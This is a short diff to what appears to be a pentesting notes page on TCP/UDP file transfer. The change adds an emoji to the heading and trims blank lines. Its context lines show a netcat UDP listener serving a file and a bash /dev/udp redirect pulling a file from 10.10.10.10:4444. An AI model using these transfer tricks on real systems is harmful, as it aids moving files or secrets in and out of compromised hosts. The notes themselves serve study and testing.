@@ -1,4 +1,4 @@
-# TCP / UDP
+# ⭕ TCP / UDP
 
 ## /dev/tcp & /dev/udp
 
@@ -46,6 +46,3 @@ nc -w5 -ulvnp 80 < file_to_send.txt # server
 exec 6< /dev/udp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-
-
-
